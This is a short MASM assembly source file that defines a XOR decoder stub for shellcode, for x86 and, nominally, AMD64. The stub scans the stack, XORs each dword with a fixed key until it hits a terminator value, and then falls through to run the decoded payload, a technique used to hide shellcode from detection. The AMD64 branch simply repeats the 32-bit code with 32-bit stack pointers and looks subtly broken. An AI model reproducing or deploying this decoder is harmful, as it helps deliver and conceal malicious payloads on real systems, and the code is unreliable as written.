; masm syntax

;IA86 and AMD64
IFDEF _M_IA86
.386
.model flat, stdcall
ENDIF

;set code section .shell
.CODE shell

size_ptr dd 1

IFDEF _M_IA86

xor_decoder PROC
	mov eax, esp					; get esp
	add eax, 1Ch					; add offset relatively end decode

	decode:
		mov ebx, [eax]				; get value from stack
		
		cmp ebx, 0FEFEFEFEh			; if shellcode end
		je end_decode				; execute shellcode
		
		xor ebx, 43213412h			; 
		mov [eax], ebx				; change value in stack

		add eax, sizeof size_ptr	; get sizeof void*
		jmp short decode			; repeat

	end_decode:
		; follows decoded shellcode
xor_decoder ENDP

xor_decoder_end PROC
xor_decoder_end ENDP


ELSEIFDEF _M_AMD64

xor_decoder PROC
	mov eax, esp					; get esp
	add eax, 1Ch					; add offset relatively end decode

	decode:
		mov ebx, [eax]				; get value from stack
		
		cmp ebx, 0FEFEFEFEh			; if shellcode end
		je end_decode				; execute shellcode
		
		xor ebx, 43213412h			;
		mov [eax], ebx				; change value in stack

		add eax, sizeof size_ptr	; Get sizeof void*
		jmp short decode			; repeat

	end_decode:
		; follows decoded shellcode
xor_decoder ENDP

xor_decoder_end PROC
xor_decoder_end ENDP

ENDIF

END